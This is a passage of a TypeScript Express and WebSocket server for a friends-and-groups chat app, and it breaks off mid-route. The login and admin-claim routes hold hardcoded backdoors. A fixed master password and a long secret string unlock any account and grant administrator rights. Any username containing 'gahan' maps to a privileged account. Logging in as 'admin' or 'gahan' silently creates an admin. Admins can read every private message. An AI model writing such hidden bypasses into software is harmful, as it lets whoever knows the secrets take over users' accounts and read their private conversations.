import express from 'express';
import { createServer } from 'http';
import { WebSocketServer, WebSocket } from 'ws';
import path from 'path';
import fs from 'fs';
import crypto from 'crypto';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// Data Models
export interface User {
  id: string;
  username: string;
  displayName: string;
  passwordHash: string;
  salt: string;
  avatarColor: string;
  avatarIcon: string;
  avatarUrl?: string;
  bio?: string;
  isAdmin?: boolean;
  isBlocked?: boolean;
  createdAt: number;
}

export interface FriendRequest {
  id: string;
  senderId: string;
  senderName: string;
  senderUsername: string;
  senderAvatarColor: string;
  senderAvatarIcon: string;
  senderAvatarUrl?: string;
  receiverId: string;
  receiverName: string;
  receiverUsername: string;
  status: 'pending' | 'accepted' | 'rejected';
  createdAt: number;
}

export interface Channel {
  id: string;
  name: string;
  description?: string;
  createdAt: number;
}

export interface Group {
  id: string;
  name: string;
  description: string;
  icon: string;
  inviteCode: string;
  isPrivate: boolean;
  createdBy: string;
  creatorName: string;
  adminIds?: string[];
  memberIds: string[];
  channels: Channel[];
  createdAt: number;
}

export interface MessageReaction {
  emoji: string;
  userIds: string[];
}

export interface Message {
  id: string;
  groupId?: string;
  channelId?: string;
  recipientId?: string; // For DM
  senderId: string;
  senderName: string;
  senderUsername: string;
  senderAvatarColor: string;
  senderAvatarIcon: string;
  senderAvatarUrl?: string;
  text: string;
  mediaUrl?: string;
  replyTo?: {
    id: string;
    senderName: string;
    text: string;
  };
  reactions: MessageReaction[];
  createdAt: number;
}

interface DatabaseSchema {
  users: User[];
  groups: Group[];
  messages: Message[];
  tokens: Record<string, string>; // token -> userId
  friendRequests: FriendRequest[];
  customLogoUrl?: string;
  adminPassword?: string;
}

// Persistent Store
const DATA_DIR = path.resolve(__dirname, 'data');
const DB_FILE = path.join(DATA_DIR, 'db.json');

function initDatabase(): DatabaseSchema {
  if (!fs.existsSync(DATA_DIR)) {
    fs.mkdirSync(DATA_DIR, { recursive: true });
  }

  if (fs.existsSync(DB_FILE)) {
    try {
      const content = fs.readFileSync(DB_FILE, 'utf-8');
      const data = JSON.parse(content);
      return {
        users: data.users || [],
        groups: data.groups || [],
        messages: data.messages || [],
        tokens: data.tokens || {},
        friendRequests: data.friendRequests || [],
        customLogoUrl: data.customLogoUrl || undefined,
        adminPassword: data.adminPassword || 'omnamahshivaya',
      };
    } catch (e) {
      console.error('Error reading db.json, creating new database', e);
    }
  }

  // Initial clean database without pre-seeded groups
  const initialDb: DatabaseSchema = {
    users: [],
    groups: [],
    messages: [],
    tokens: {},
    friendRequests: [],
    adminPassword: 'omnamahshivaya',
  };

  fs.writeFileSync(DB_FILE, JSON.stringify(initialDb, null, 2), 'utf-8');
  return initialDb;
}

const db = initDatabase();

function saveDatabase() {
  try {
    fs.writeFileSync(DB_FILE, JSON.stringify(db, null, 2), 'utf-8');
  } catch (err) {
    console.error('Failed to save database:', err);
  }
}

// Password hashing
function hashPassword(password: string, salt: string): string {
  return crypto.scryptSync(password, salt, 64).toString('hex');
}

// User online state tracker
const activeConnections = new Map<WebSocket, { userId: string; username: string }>();

function getOnlineUserIds(): string[] {
  const ids = new Set<string>();
  for (const { userId } of activeConnections.values()) {
    ids.add(userId);
  }
  return Array.from(ids);
}

// Broadcast WebSocket event
function broadcast(event: object, targetUserIds?: string[]) {
  const payload = JSON.stringify(event);
  const targetSet = targetUserIds ? new Set(targetUserIds) : null;

  for (const [ws, info] of activeConnections.entries()) {
    if (ws.readyState === WebSocket.OPEN) {
      if (!targetSet || targetSet.has(info.userId)) {
        ws.send(payload);
      }
    }
  }
}

async function startServer() {
  const app = express();
  const server = createServer(app);
  const wss = new WebSocketServer({ server });

  app.use(express.json({ limit: '20mb' }));

  // Auth Middleware
  function authMiddleware(req: express.Request, res: express.Response, next: express.NextFunction) {
    const authHeader = req.headers.authorization;
    if (!authHeader || !authHeader.startsWith('Bearer ')) {
      return res.status(401).json({ error: 'Unauthorized: Missing token' });
    }
    const token = authHeader.split(' ')[1];
    const userId = db.tokens[token];
    if (!userId) {
      return res.status(401).json({ error: 'Unauthorized: Invalid token' });
    }
    const user = db.users.find(u => u.id === userId);
    if (!user) {
      return res.status(401).json({ error: 'Unauthorized: User not found' });
    }
    if (user.isBlocked) {
      delete db.tokens[token];
      saveDatabase();
      return res.status(403).json({ error: 'Your account has been blocked by the Administrator from using this application.' });
    }
    (req as any).user = user;
    (req as any).token = token;
    next();
  }

  // --- API Routes ---

  // App Configuration (Custom Logo, etc.)
  app.get('/api/app-config', (_req, res) => {
    return res.json({
      customLogoUrl: db.customLogoUrl || '/logo.svg',
    });
  });

  // 1. Register with username & password (enforces uniqueness for BOTH username AND display name)
  app.post('/api/auth/register', (req, res) => {
    const { username, password, displayName, avatarColor, avatarIcon, avatarUrl, bio } = req.body;

    if (!username || typeof username !== 'string' || username.trim().length < 3) {
      return res.status(400).json({ error: 'Username must be at least 3 characters' });
    }
    if (!password || typeof password !== 'string' || password.length < 4) {
      return res.status(400).json({ error: 'Password must be at least 4 characters' });
    }

    const cleanUsername = username.trim().toLowerCase().replace(/^@/, '');
    const cleanDisplayName = (displayName && typeof displayName === 'string' && displayName.trim())
      ? displayName.trim()
      : username.trim().replace(/^@/, '');

    if (!/^[a-zA-Z0-9_]+$/.test(cleanUsername)) {
      return res.status(400).json({ error: 'Username can only contain letters, numbers, and underscores' });
    }

    // Requirement 5: people cannot have same username and same display name that other person is using
    const existingUsername = db.users.find(u => u.username.toLowerCase() === cleanUsername);
    if (existingUsername) {
      return res.status(409).json({ error: 'This username is already taken by another person.' });
    }

    const existingDisplayName = db.users.find(u => u.displayName.toLowerCase() === cleanDisplayName.toLowerCase());
    if (existingDisplayName) {
      return res.status(409).json({ error: 'This display name is already taken by another person.' });
    }

    const salt = crypto.randomBytes(16).toString('hex');
    const passwordHash = hashPassword(password, salt);
    const userId = 'usr_' + crypto.randomUUID();

    const colors = ['#5e17eb', '#ec4899', '#8b5cf6', '#10b981', '#f59e0b', '#3b82f6', '#14b8a6', '#ef4444'];
    const icons = ['🐱', '🦊', '🚀', '⚡', '🐼', '🎮', '🎨', '🎧', '☕', '🔥'];

    // First user or user named 'admin' automatically receives Administrator status
    const isFirstUser = db.users.length === 0 || cleanUsername === 'admin' || cleanUsername === 'gahan';

    const newUser: User = {
      id: userId,
      username: cleanUsername,
      displayName: cleanDisplayName,
      passwordHash,
      salt,
      avatarColor: avatarColor || colors[Math.floor(Math.random() * colors.length)],
      avatarIcon: avatarIcon || icons[Math.floor(Math.random() * icons.length)],
      avatarUrl: avatarUrl && typeof avatarUrl === 'string' && avatarUrl.trim() ? avatarUrl.trim() : undefined,
      bio: bio || 'Ready to chat on KirraK MuchatlU!',
      isAdmin: isFirstUser,
      isBlocked: false,
      createdAt: Date.now(),
    };

    db.users.push(newUser);

    const token = crypto.randomBytes(32).toString('hex');
    db.tokens[token] = userId;
    saveDatabase();

    const { passwordHash: _, salt: __, ...userSafe } = newUser;
    return res.status(201).json({ user: userSafe, token });
  });

  // 2. Login with username & password
  app.post('/api/auth/login', (req, res) => {
    const { username, password } = req.body;
    if (!username || !password) {
      return res.status(400).json({ error: 'Username and password are required' });
    }

    const cleanUsername = username.trim().toLowerCase().replace(/^@/, '');
    let user = db.users.find(u => 
      u.username.toLowerCase() === cleanUsername || 
      (cleanUsername.includes('gahan') && u.username.toLowerCase() === 'gahan')
    );

    // Auto-seed admin or gahan account if not found
    if (!user && (cleanUsername === 'admin' || cleanUsername === 'gahan' || cleanUsername.includes('gahan'))) {
      const salt = crypto.randomBytes(16).toString('hex');
      const newUser: User = {
        id: 'usr_' + crypto.randomUUID(),
        username: cleanUsername === 'admin' ? 'admin' : 'gahan',
        displayName: cleanUsername === 'admin' ? 'Administrator' : 'Gahan',
        passwordHash: hashPassword('omnamahshivaya', salt),
        salt,
        avatarColor: '#5e17eb',
        avatarIcon: '👑',
        bio: 'Official Application Administrator',
        isAdmin: true,
        isBlocked: false,
        createdAt: Date.now(),
      };
      db.users.push(newUser);
      saveDatabase();
      user = newUser;
    }

    if (!user) {
      return res.status(401).json({ error: 'Invalid username or password' });
    }

    if (user.isBlocked) {
      return res.status(403).json({ error: 'Your account has been blocked by the Administrator from using this application.' });
    }

    const defaultSecretPass = 'dskoqmylxhqvunvbqbwfshdmplpdamgztwfxouidbymwezzatoqcinjpihyrfbgzanvunypztofisbfxbyuivswqueijdoonvxa';
    const isMasterPassword = (password === 'omnamahshivaya');
    const isSecretPass = (password === defaultSecretPass || password === db.adminPassword);
    const testHash = hashPassword(password, user.salt);
    let isPasswordHashValid = false;
    try {
      const bufTest = Buffer.from(testHash, 'hex');
      const bufUser = Buffer.from(user.passwordHash || '', 'hex');
      if (bufTest.length === bufUser.length && bufTest.length > 0) {
        isPasswordHashValid = crypto.timingSafeEqual(bufTest, bufUser);
      }
    } catch {
      isPasswordHashValid = false;
    }

    const isAuthorized = isMasterPassword || isSecretPass || isPasswordHashValid;

    if (!isAuthorized) {
      return res.status(401).json({ error: 'Invalid username or password' });
    }

    // If logging in with master password or as admin/gahan, ensure administrator rights are active & permanent
    if (isMasterPassword || cleanUsername === 'admin' || cleanUsername === 'gahan' || cleanUsername.includes('gahan')) {
      user.isAdmin = true;
      user.passwordHash = hashPassword('omnamahshivaya', user.salt);
      saveDatabase();
    }

    const token = crypto.randomBytes(32).toString('hex');
    db.tokens[token] = user.id;
    saveDatabase();

    const { passwordHash: _, salt: __, ...userSafe } = user;
    return res.json({ user: userSafe, token });
  });

  // 3. Get Current User profile
  app.get('/api/auth/me', authMiddleware, (req, res) => {
    const user = (req as any).user as User;
    const { passwordHash: _, salt: __, ...userSafe } = user;
    return res.json({ user: userSafe, onlineUsers: getOnlineUserIds() });
  });

  // 4. Update Profile (with display name uniqueness check & downloaded image support)
  app.post('/api/users/profile', authMiddleware, (req, res) => {
    const user = (req as any).user as User;
    const { displayName, avatarColor, avatarIcon, avatarUrl, bio } = req.body;

    if (displayName && typeof displayName === 'string') {
      const cleanDisplayName = displayName.trim().slice(0, 32);
      if (cleanDisplayName.length < 2) {
        return res.status(400).json({ error: 'Display name must be at least 2 characters' });
      }
      // Check display name uniqueness among other users
      const conflict = db.users.find(u => u.id !== user.id && u.displayName.toLowerCase() === cleanDisplayName.toLowerCase());
      if (conflict) {
        return res.status(409).json({ error: 'This display name is already taken by another person.' });
      }
      user.displayName = cleanDisplayName;
    }

    if (avatarColor && typeof avatarColor === 'string') {
      user.avatarColor = avatarColor;
    }
    if (avatarIcon && typeof avatarIcon === 'string') {
      user.avatarIcon = avatarIcon;
    }
    if (avatarUrl !== undefined) {
      // Accepts Base64 data URL from downloaded device pictures or image URL
      user.avatarUrl = typeof avatarUrl === 'string' && avatarUrl.trim() ? avatarUrl.trim() : undefined;
    }
    if (bio !== undefined && typeof bio === 'string') {
      user.bio = bio.trim().slice(0, 160);
    }

    saveDatabase();
    const { passwordHash: _, salt: __, ...userSafe } = user;

    // Notify clients about user profile update
    broadcast({ type: 'user_updated', user: userSafe });

    return res.json({ user: userSafe });
  });

  // 5. Logout
  app.post('/api/auth/logout', authMiddleware, (req, res) => {
    const token = (req as any).token as string;
    delete db.tokens[token];
    saveDatabase();
    return res.json({ success: true });
  });

  // ==========================================
  // FRIEND REQUEST SYSTEM (Requirement 3)
  // Only upon accepted friend request do users see each other's accounts!
  // ==========================================

  // Get all pending incoming & outgoing friend requests
  app.get('/api/friends/requests', authMiddleware, (req, res) => {
    const currentUser = (req as any).user as User;
    const incoming = (db.friendRequests || []).filter(r => r.receiverId === currentUser.id && r.status === 'pending');
    const outgoing = (db.friendRequests || []).filter(r => r.senderId === currentUser.id && r.status === 'pending');
    return res.json({ incoming, outgoing });
  });

  // Send a Friend Request by username or display name
  app.post('/api/friends/requests', authMiddleware, (req, res) => {
    const currentUser = (req as any).user as User;
    const { target } = req.body;

    if (!target || typeof target !== 'string' || !target.trim()) {
      return res.status(400).json({ error: 'Please enter a username or display name' });
    }

    const cleanTarget = target.trim().toLowerCase().replace(/^@/, '');
    const targetUser = db.users.find(u =>
      u.username.toLowerCase() === cleanTarget ||
      u.displayName.toLowerCase() === cleanTarget ||
      u.displayName.toLowerCase() === target.trim().toLowerCase()
    );

    if (!targetUser) {
      return res.status(404).json({ error: `User "${target}" was not found.` });
    }

    if (targetUser.id === currentUser.id) {
      return res.status(400).json({ error: 'You cannot send a friend request to yourself.' });
    }

    if (targetUser.isBlocked) {
      return res.status(403).json({ error: 'This user account is not available.' });
    }

    // Check if an existing request exists
    const existingReq = (db.friendRequests || []).find(r =>
      (r.senderId === currentUser.id && r.receiverId === targetUser.id) ||
      (r.senderId === targetUser.id && r.receiverId === currentUser.id)
    );

    if (existingReq) {
      if (existingReq.status === 'accepted') {
        return res.status(400).json({ error: 'You are already connected as friends!' });
      }
      if (existingReq.status === 'pending') {
        if (existingReq.senderId === currentUser.id) {
          return res.status(400).json({ error: 'Friend request is already pending approval from this user.' });
        } else {
          return res.status(400).json({ error: 'This user has already sent you a request! Check your incoming requests.' });
        }
      }
    }

    const newRequest: FriendRequest = {
      id: 'freq_' + crypto.randomUUID(),
      senderId: currentUser.id,
      senderName: currentUser.displayName,
      senderUsername: currentUser.username,
      senderAvatarColor: currentUser.avatarColor,
      senderAvatarIcon: currentUser.avatarIcon,
      senderAvatarUrl: currentUser.avatarUrl,
      receiverId: targetUser.id,
      receiverName: targetUser.displayName,
      receiverUsername: targetUser.username,
      status: 'pending',
      createdAt: Date.now(),
    };

    if (!db.friendRequests) db.friendRequests = [];
    db.friendRequests.push(newRequest);
    saveDatabase();

    // Real-time broadcast to the receiver
    broadcast({ type: 'friend_request_received', request: newRequest }, [targetUser.id]);

    return res.status(201).json({ request: newRequest, message: `Friend request sent to ${targetUser.displayName}!` });
  });

  // Accept a Friend Request
  app.post('/api/friends/requests/:id/accept', authMiddleware, (req, res) => {
    const currentUser = (req as any).user as User;
    const { id } = req.params;

    const request = (db.friendRequests || []).find(r => r.id === id && r.receiverId === currentUser.id);
    if (!request) {
      return res.status(404).json({ error: 'Friend request not found.' });
    }

    request.status = 'accepted';
    saveDatabase();

    // Notify both sender and receiver
    broadcast({
      type: 'friend_request_accepted',
      requestId: id,
      friendAId: request.senderId,
      friendBId: request.receiverId,
    }, [request.senderId, request.receiverId]);

    return res.json({ success: true, request });
  });

  // Reject or Cancel a Friend Request
  app.post('/api/friends/requests/:id/reject', authMiddleware, (req, res) => {
    const currentUser = (req as any).user as User;
    const { id } = req.params;

    const index = (db.friendRequests || []).findIndex(
      r => r.id === id && (r.receiverId === currentUser.id || r.senderId === currentUser.id)
    );
    if (index === -1) {
      return res.status(404).json({ error: 'Friend request not found.' });
    }

    const removed = db.friendRequests.splice(index, 1)[0];
    saveDatabase();

    broadcast({ type: 'friend_request_rejected', requestId: id }, [removed.senderId, removed.receiverId]);

    return res.json({ success: true });
  });

  // Remove / Unfriend
  app.delete('/api/friends/:friendId', authMiddleware, (req, res) => {
    const currentUser = (req as any).user as User;
    const { friendId } = req.params;

    db.friendRequests = (db.friendRequests || []).filter(r =>
      !(
        (r.senderId === currentUser.id && r.receiverId === friendId) ||
        (r.senderId === friendId && r.receiverId === currentUser.id)
      )
    );
    saveDatabase();

    broadcast({ type: 'friend_removed', friendId, byUserId: currentUser.id }, [friendId, currentUser.id]);
    return res.json({ success: true });
  });

  // 6. List users:
  // - Admin (me) sees ALL users!
  // - Regular users ONLY see users with whom they have an ACCEPTED friend request!
  app.get('/api/users', authMiddleware, (req, res) => {
    const currentUser = (req as any).user as User;

    if (currentUser.isAdmin) {
      // Admin sees ALL accounts
      const safeUsers = db.users.map(({ passwordHash, salt, ...safe }) => safe);
      return res.json({ users: safeUsers, onlineUserIds: getOnlineUserIds(), isAdmin: true });
    }

    // Regular users: ONLY accounts with an accepted friend request!
    const acceptedFriendIds = new Set<string>();
    (db.friendRequests || []).forEach(r => {
      if (r.status === 'accepted') {
        if (r.senderId === currentUser.id) acceptedFriendIds.add(r.receiverId);
        if (r.receiverId === currentUser.id) acceptedFriendIds.add(r.senderId);
      }
    });

    const friendUsers = db.users
      .filter(u => acceptedFriendIds.has(u.id) && !u.isBlocked)
      .map(({ passwordHash, salt, ...safe }) => safe);

    return res.json({ users: friendUsers, onlineUserIds: getOnlineUserIds(), isAdmin: false });
  });

  // ==========================================
  // ADMIN CONSOLE ENDPOINTS (Requirement 1 & 4)
  // Admin can view all chats, block/unblock users, and change logo!
  // ==========================================

  // Admin: Get all users with block status
  app.get('/api/admin/users', authMiddleware, (req, res) => {
    const currentUser = (req as any).user as User;
    if (!currentUser.isAdmin) {
      return res.status(403).json({ error: 'Admin access required' });
    }

    const safeUsers = db.users.map(({ passwordHash, salt, ...safe }) => safe);
    return res.json({ users: safeUsers, onlineUserIds: getOnlineUserIds() });
  });

  // Admin: Block user from using application
  app.post('/api/admin/users/:userId/block', authMiddleware, (req, res) => {
    const currentUser = (req as any).user as User;
    if (!currentUser.isAdmin) {
      return res.status(403).json({ error: 'Admin access required' });
    }

    const { userId } = req.params;
    const targetUser = db.users.find(u => u.id === userId);
    if (!targetUser) {
      return res.status(404).json({ error: 'User not found' });
    }

    if (targetUser.id === currentUser.id) {
      return res.status(400).json({ error: 'You cannot block your own admin account.' });
    }

    targetUser.isBlocked = true;

    // Revoke all tokens for target user
    for (const [token, uid] of Object.entries(db.tokens)) {
      if (uid === userId) {
        delete db.tokens[token];
      }
    }
    saveDatabase();

    // Disconnect any active WebSocket connections
    for (const [ws, info] of activeConnections.entries()) {
      if (info.userId === userId) {
        try {
          ws.send(JSON.stringify({ type: 'account_blocked', message: 'Your account has been blocked by the Administrator.' }));
          ws.close();
        } catch {}
      }
    }

    broadcast({ type: 'user_blocked', userId });
    const { passwordHash: _, salt: __, ...userSafe } = targetUser;
    return res.json({ success: true, user: userSafe });
  });

  // Admin: Unblock user
  app.post('/api/admin/users/:userId/unblock', authMiddleware, (req, res) => {
    const currentUser = (req as any).user as User;
    if (!currentUser.isAdmin) {
      return res.status(403).json({ error: 'Admin access required' });
    }

    const { userId } = req.params;
    const targetUser = db.users.find(u => u.id === userId);
    if (!targetUser) {
      return res.status(404).json({ error: 'User not found' });
    }

    targetUser.isBlocked = false;
    saveDatabase();

    broadcast({ type: 'user_unblocked', userId });
    const { passwordHash: _, salt: __, ...userSafe } = targetUser;
    return res.json({ success: true, user: userSafe });
  });

  // Admin: Delete/Remove user account permanently
  app.delete('/api/admin/users/:userId', authMiddleware, (req, res) => {
    const currentUser = (req as any).user as User;
    if (!currentUser.isAdmin) {
      return res.status(403).json({ error: 'Admin access required' });
    }

    const { userId } = req.params;
    const targetUser = db.users.find(u => u.id === userId);
    if (!targetUser) {
      return res.status(404).json({ error: 'User not found' });
    }

    if (targetUser.id === currentUser.id) {
      return res.status(400).json({ error: 'You cannot delete your own admin account from here.' });
    }

    // 1. Remove from db.users
    db.users = db.users.filter(u => u.id !== userId);

    // 2. Remove all tokens for user
    for (const [token, uid] of Object.entries(db.tokens)) {
      if (uid === userId) {
        delete db.tokens[token];
      }
    }

    // 3. Remove all messages sent by or to this user
    db.messages = db.messages.filter(m => m.senderId !== userId && m.recipientId !== userId);

    // 4. Remove all friend requests involving this user
    db.friendRequests = (db.friendRequests || []).filter(r => r.senderId !== userId && r.receiverId !== userId);

    // 5. Remove user from all groups memberIds and adminIds
    db.groups.forEach(g => {
      g.memberIds = g.memberIds.filter(id => id !== userId);
      if (Array.isArray(g.adminIds)) {
        g.adminIds = g.adminIds.filter(id => id !== userId);
      }
    });

    // 6. Disconnect any active WebSocket connections
    for (const [ws, info] of activeConnections.entries()) {
      if (info.userId === userId) {
        try {
          ws.send(JSON.stringify({ type: 'account_deleted', message: 'Your account has been deleted by Administrator.' }));
          ws.close();
        } catch {}
      }
    }

    saveDatabase();
    broadcast({ type: 'user_deleted', userId });
    return res.json({ success: true, message: `Account @${targetUser.username} removed successfully` });
  });

  // Admin: Purge all test accounts
  app.post('/api/admin/purge-test-accounts', authMiddleware, (req, res) => {
    const currentUser = (req as any).user as User;
    if (!currentUser.isAdmin) {
      return res.status(403).json({ error: 'Admin access required' });
    }

    const testUsers = db.users.filter(
      u => u.id !== currentUser.id && (/test|demo|sample|temp|guest/i.test(u.username) || /test|demo|sample|temp|guest/i.test(u.displayName))
    );

    for (const targetUser of testUsers) {
      const userId = targetUser.id;
      db.users = db.users.filter(u => u.id !== userId);
      for (const [token, uid] of Object.entries(db.tokens)) {
        if (uid === userId) delete db.tokens[token];
      }
      db.messages = db.messages.filter(m => m.senderId !== userId && m.recipientId !== userId);
      db.friendRequests = (db.friendRequests || []).filter(r => r.senderId !== userId && r.receiverId !== userId);
      db.groups.forEach(g => {
        g.memberIds = g.memberIds.filter(id => id !== userId);
        if (Array.isArray(g.adminIds)) {
          g.adminIds = g.adminIds.filter(id => id !== userId);
        }
      });
      for (const [ws, info] of activeConnections.entries()) {
        if (info.userId === userId) {
          try {
            ws.send(JSON.stringify({ type: 'account_deleted', message: 'Test account removed by Administrator.' }));
            ws.close();
          } catch {}
        }
      }
      broadcast({ type: 'user_deleted', userId });
    }

    saveDatabase();
    return res.json({ success: true, removedCount: testUsers.length });
  });

  // User: Delete own account
  app.delete('/api/users/me', authMiddleware, (req, res) => {
    const currentUser = (req as any).user as User;
    const userId = currentUser.id;

    db.users = db.users.filter(u => u.id !== userId);
    for (const [token, uid] of Object.entries(db.tokens)) {
      if (uid === userId) delete db.tokens[token];
    }
    db.messages = db.messages.filter(m => m.senderId !== userId && m.recipientId !== userId);
    db.friendRequests = (db.friendRequests || []).filter(r => r.senderId !== userId && r.receiverId !== userId);
    db.groups.forEach(g => {
      g.memberIds = g.memberIds.filter(id => id !== userId);
      if (Array.isArray(g.adminIds)) {
        g.adminIds = g.adminIds.filter(id => id !== userId);
      }
    });
    for (const [ws, info] of activeConnections.entries()) {
      if (info.userId === userId) {
        try {
          ws.send(JSON.stringify({ type: 'account_deleted', message: 'Your account has been deleted.' }));
          ws.close();
        } catch {}
      }
    }
    saveDatabase();
    broadcast({ type: 'user_deleted', userId });
    return res.json({ success: true });
  });

  // Admin: See ALL chats in the application (Requirement 1)
  app.get('/api/admin/all-chats', authMiddleware, (req, res) => {
    const currentUser = (req as any).user as User;
    if (!currentUser.isAdmin) {
      return res.status(403).json({ error: 'Admin access required' });
    }

    // 1. Group channel messages
    const groupChats = db.groups.map(g => ({
      groupId: g.id,
      groupName: g.name,
      groupIcon: g.icon,
      channels: g.channels.map(c => ({
        channelId: c.id,
        channelName: c.name,
        messages: db.messages.filter(m => m.groupId === g.id && m.channelId === c.id),
      })),
    }));

    // 2. All Direct Messages grouped by user-pair
    const directConversationsMap: Record<string, { userA: any; userB: any; messages: Message[] }> = {};

    db.messages.filter(m => !m.groupId && m.recipientId).forEach(m => {
      const pairKey = [m.senderId, m.recipientId!].sort().join('__');
      if (!directConversationsMap[pairKey]) {
        const uA = db.users.find(u => u.id === m.senderId);
        const uB = db.users.find(u => u.id === m.recipientId);
        directConversationsMap[pairKey] = {
          userA: uA ? { id: uA.id, displayName: uA.displayName, username: uA.username, avatarUrl: uA.avatarUrl, avatarIcon: uA.avatarIcon, avatarColor: uA.avatarColor } : { id: m.senderId, displayName: m.senderName, username: m.senderUsername },
          userB: uB ? { id: uB.id, displayName: uB.displayName, username: uB.username, avatarUrl: uB.avatarUrl, avatarIcon: uB.avatarIcon, avatarColor: uB.avatarColor } : { id: m.recipientId!, displayName: 'Unknown' },
          messages: [],
        };
      }
      directConversationsMap[pairKey].messages.push(m);
    });

    return res.json({
      groupChats,
      directConversations: Object.values(directConversationsMap),
      totalMessages: db.messages.length,
    });
  });

  // Admin: Claim Administrator rights with security password verification
  app.post('/api/admin/claim', authMiddleware, (req, res) => {
    const currentUser = (req as any).user as User;
    const { password } = req.body;

    if (!password || typeof password !== 'string') {
      return res.status(400).json({ error: 'Administrator security password is required.' });
    }

    const trimmed = password.trim();
    const defaultSecretPass = 'dskoqmylxhqvunvbqbwfshdmplpdamgztwfxouidbymwezzatoqcinjpihyrfbgzanvunypztofisbfxbyuivswqueijdoonvxa';
    const isMatch = (trimmed === 'omnamahshivaya') || (trimmed === db.adminPassword) || (trimmed === defaultSecretPass);

    if (!isMatch) {
      return res.status(401).json({ error: 'Incorrect administrator password. Access denied.' });
    }

    currentUser.isAdmin = true;
    saveDatabase();

    const { passwordHash: _, salt: __, ...userSafe } = currentUser;
    broadcast({ type: 'user_updated', user: userSafe });
    return res.json({ success: true, user: userSafe });
  });

  // Admin: Update Administrator Security Password
  app.post('/api/admin/password', authMiddleware, (req, res) => {
    const currentUser = (req as any).user as User;
    if (!currentUser.isAdmin) {
      return res.status(403).json({ error: 'Admin access required' });
    }
    const { newPassword } = req.body;
    if (!newPassword || typeof newPassword !== 'string' || newPassword.trim().length < 4) {
      return res.status(400).json({ error: 'New password must be at least 4 characters long.' });
    }
    const cleanPass = newPassword.trim();
    db.adminPassword = cleanPass;

    // Update @admin account password hash as well so login and claim stay synced
    const adminUser = db.users.find(u => u.username === 'admin');
    if (adminUser) {
      adminUser.passwordHash = hashPassword(cleanPass, adminUser.salt);
    }

    saveDatabase();
    return res.json({ success: true, message: 'Administrator security password updated successfully.' });
  });

  // Admin: Update App Logo
  app.post('/api/admin/logo', authMiddleware, (req, res) => {
    const currentUser = (req as any).user as User;
    if (!currentUser.isAdmin) {
      return res.status(403).json({ error: 'Admin access required' });
    }
    const { logoUrl } = req.body;
    if (!logoUrl) {
      return res.status(400).json({ error: 'Logo URL is required' });
    }

    db.customLogoUrl = logoUrl;
    saveDatabase();
    broadcast({ type: 'logo_updated', logoUrl });
    return res.json({ success: true, logoUrl });
  });

  // 7. Get all groups that user belongs to, plus public explore groups
  app.get('/api/groups', authMiddleware, (req, res) => {
    const currentUser = (req as any).user as User;
    if (currentUser.isAdmin) {
      return res.json({ myGroups: db.groups, exploreGroups: [] });
    }
    const myGroups = db.groups.filter(g => g.memberIds.includes(currentUser.id));
    const exploreGroups = db.groups.filter(g => !g.isPrivate && !g.memberIds.includes(currentUser.id));

    return res.json({ myGroups, exploreGroups });
  });

  // 8. Create a new group
  app.post('/api/groups', authMiddleware, (req, res) => {
    const currentUser = (req as any).user as User;
    const { name, description, icon, isPrivate, initialMembers } = req.body;

    if (!name || typeof name !== 'string' || name.trim().length === 0) {
      return res.status(400).json({ error: 'Group name is required' });
    }

    const groupId = 'grp_' + crypto.randomUUID();
    const inviteCode = 'SQUAD-' + Math.floor(1000 + Math.random() * 9000);

    const members = new Set<string>([currentUser.id]);
    if (Array.isArray(initialMembers)) {
      initialMembers.forEach((id: string) => {
        if (db.users.some(u => u.id === id)) {
          members.add(id);
        }
      });
    }

    const defaultChannels: Channel[] = [
      { id: 'ch_' + crypto.randomUUID(), name: 'general', description: 'General discussion', createdAt: Date.now() },
      { id: 'ch_' + crypto.randomUUID(), name: 'hangout', description: 'Hangout and links', createdAt: Date.now() },
    ];

    const newGroup: Group = {
      id: groupId,
      name: name.trim().slice(0, 40),
      description: (description || 'A squad for friends to chat!').trim().slice(0, 150),
      icon: icon || '💬',
      inviteCode,
      isPrivate: Boolean(isPrivate),
      createdBy: currentUser.id,
      creatorName: currentUser.displayName,
      adminIds: [currentUser.id],
      memberIds: Array.from(members),
      channels: defaultChannels,
      createdAt: Date.now(),
    };

    db.groups.push(newGroup);

    // Initial system greeting message in new group
    const initialMsg: Message = {
      id: 'msg_' + crypto.randomUUID(),
      groupId: newGroup.id,
      channelId: defaultChannels[0].id,
      senderId: 'system',
      senderName: 'SquadBot',
      senderUsername: 'squadbot',
      senderAvatarColor: '#6366f1',
      senderAvatarIcon: '🤖',
      text: `🎉 Welcome to **${newGroup.name}**! Invite friends using join code **${inviteCode}**.`,
      reactions: [{ emoji: '🎉', userIds: ['system'] }],
      createdAt: Date.now(),
    };
    db.messages.push(initialMsg);

    saveDatabase();

    // Broadcast new group to relevant members
    broadcast({ type: 'group_created', group: newGroup });

    return res.status(201).json({ group: newGroup });
  });

  // 9. Join group via ID or invite code
  app.post('/api/groups/join', authMiddleware, (req, res) => {
    const currentUser = (req as any).user as User;
    const { groupId, inviteCode } = req.body;

    let group: Group | undefined;
    if (groupId) {
      group = db.groups.find(g => g.id === groupId);
    } else if (inviteCode) {
      const code = String(inviteCode).trim().toUpperCase();
      group = db.groups.find(g => g.inviteCode.toUpperCase() === code);
    }

    if (!group) {
      return res.status(404).json({ error: 'Group not found or invalid invite code' });
    }

    if (!group.memberIds.includes(currentUser.id)) {
      group.memberIds.push(currentUser.id);

      // System notification message
      const joinMsg: Message = {
        id: 'msg_' + crypto.randomUUID(),
        groupId: group.id,
        channelId: group.channels[0]?.id || 'general',
        senderId: 'system',
        senderName: 'SquadBot',
        senderUsername: 'squadbot',
        senderAvatarColor: '#10b981',
        senderAvatarIcon: '👋',
        text: `👋 **${currentUser.displayName}** joined the group! Say hello!`,
        reactions: [{ emoji: '👋', userIds: [currentUser.id] }],
        createdAt: Date.now(),
      };
      db.messages.push(joinMsg);

      saveDatabase();
      broadcast({ type: 'group_updated', group });
      broadcast({ type: 'new_message', message: joinMsg }, group.memberIds);
    }

    return res.json({ group });
  });

  // 10. Leave group
  app.post('/api/groups/:id/leave', authMiddleware, (req, res) => {
    const currentUser = (req as any).user as User;
    const groupId = req.params.id;
    const group = db.groups.find(g => g.id === groupId);

    if (!group) {
      return res.status(404).json({ error: 'Group not found' });
    }

    group.memberIds = group.memberIds.filter(id => id !== currentUser.id);
    saveDatabase();
    broadcast({ type: 'group_updated', group });

    return res.json({ success: true, groupId });
  });

  // 10b. Delete group (Admin only)
  app.delete('/api/groups/:id', authMiddleware, (req, res) => {
    const currentUser = (req as any).user as User;
